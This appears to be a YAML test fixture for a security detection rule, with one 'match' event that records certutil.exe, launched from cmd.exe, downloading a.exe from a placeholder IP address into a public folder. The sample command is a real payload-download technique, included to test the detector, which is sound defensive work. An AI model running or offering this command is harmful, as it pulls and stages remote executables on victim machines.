match:
  - desc: "certutil fetches a payload from an IP address"
    events:
      - {"name": "CreateProcess", "platform": "windows", "proc": {"pid": 6228, "ppid": 4000, "exe": "C:\\Windows\\System32\\certutil.exe", "name": "certutil.exe", "uid": -1, "euid": -1, "username": "CORP\\alice", "cmdline": "certutil.exe -urlcache -split -f http://198.51.100.7/a.exe C:\\Users\\Public\\a.exe", "original_name": "CertUtil.exe", "parent": {"pid": 4000, "exe": "C:\\Windows\\System32\\cmd.exe", "name": "cmd.exe"}}}
nomatch:
